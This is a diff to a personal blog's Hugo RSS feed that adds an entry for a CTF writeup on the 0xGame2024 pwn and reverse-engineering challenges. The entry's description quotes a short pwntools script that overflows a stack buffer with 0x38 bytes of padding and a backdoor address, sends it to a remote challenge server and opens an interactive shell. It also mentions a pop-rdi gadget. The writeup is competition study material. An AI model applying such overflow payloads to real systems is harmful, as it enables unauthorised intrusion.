@@ -7,8 +7,15 @@
     <generator>Hugo -- 0.112.4</generator>
     <language>en-US</language>
     <copyright>ycna07</copyright>
-    <lastBuildDate>Wed, 06 Nov 2024 04:55:29 +0000</lastBuildDate>
+    <lastBuildDate>Wed, 06 Nov 2024 21:18:15 +0800</lastBuildDate>
     <atom:link href="https://ycna07.github.io/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>0xGame2024 Pwn&amp;Rev</title>
+      <link>https://ycna07.github.io/posts/writeups/0xgame2024/</link>
+      <pubDate>Tue, 15 Oct 2024 21:18:15 +0800</pubDate>
+      <guid>https://ycna07.github.io/posts/writeups/0xgame2024/</guid>
+      <description>PWN Week1 1.testyourpwntool 2.stackoverflow 00007ffdad8c5320 00007ffdad8c5358 38 backdoor：4012bd from pwn import * io = remote(&amp;#39;47.97.58.52&amp;#39;, 40001) payload=b&amp;#39;a&amp;#39;*0x38+p64(0x00000000004012BD) io.send(payload) io.send(b&amp;#39;a&amp;#39;*0x38+p64(0x00000000004012BD)) io.send(&amp;#39;\n&amp;#39;) io.interactive() 5.whereismybinsh pop_rdi_ret:0x0000000000401323 4.find_me 尝试ioexp 查看libc.so.6版本</description>
+    </item>
     <item>
       <title>SROP</title>
       <link>https://ycna07.github.io/posts/blog/srop/</link>
